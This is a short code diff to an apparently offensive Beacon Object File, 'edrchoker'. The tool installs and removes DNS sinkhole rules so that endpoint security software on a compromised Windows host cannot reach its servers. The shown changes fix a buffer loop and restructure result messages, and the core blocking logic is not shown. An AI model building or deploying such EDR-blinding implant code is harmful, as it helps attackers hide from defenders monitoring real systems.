@@ -345,7 +345,7 @@ void go(char* args, int len) {
     /* Copy arg to mutable stack buffer */
     wchar_t buf[2048];
     int i;
-    for (i = 0; i < 2047; i++) buf[i] = L'\0';
+    for (i = 0; i < 2048; i++) buf[i] = L'\0';
     if (rawArg && argBytes > 2) {
         int n = argBytes / (int)sizeof(wchar_t);
         if (n >= 2048) n = 2047;
@@ -424,10 +424,16 @@ void go(char* args, int len) {
             BeaconPrintf(CALLBACK_ERROR,
                 "[!] DnsFlushResolverCache() failed — rules will activate on next TTL expiry\n");
 
-        BeaconPrintf(ok == total ? CALLBACK_OUTPUT : CALLBACK_ERROR,
-            "[*] RESULT: %d/%d sinkhole rules installed\n"
-            "    EDR cannot resolve its C2 domains\n",
-            ok, total);
+        if (ok == total) {
+            BeaconPrintf(CALLBACK_OUTPUT,
+                "[*] RESULT: %d/%d sinkhole rules installed\n"
+                "    EDR cannot resolve its C2 domains\n",
+                ok, total);
+        } else {
+            BeaconPrintf(CALLBACK_ERROR,
+                "[*] RESULT: %d/%d sinkhole rules installed (some failed)\n",
+                ok, total);
+        }
 
     /* ── MODE 1: REMOVE ALL edrchoker_ NRPT RULES ───────────────────────── */
     } else {
@@ -441,12 +447,14 @@ void go(char* args, int len) {
             BeaconPrintf(CALLBACK_OUTPUT,
                 "[*] DNS cache flushed\n");
 
-        BeaconPrintf(removed > 0 ? CALLBACK_OUTPUT : CALLBACK_ERROR,
-            "[*] RESULT: %d rule(s) removed\n"
-            "    %s\n",
-            removed,
-            removed > 0 ? "EDR DNS resolution restored" :
-                          "No edrchoker_ rules found (already removed?)");
+        if (removed > 0) {
+            BeaconPrintf(CALLBACK_OUTPUT,
+                "[*] RESULT: %d rule(s) removed — EDR DNS resolution restored\n",
+                removed);
+        } else {
+            BeaconPrintf(CALLBACK_ERROR,
+                "[*] RESULT: 0 rules removed (no edrchoker_ rules found)\n");
+        }
     }
 
     ADVAPI32$RegCloseKey(hBase);
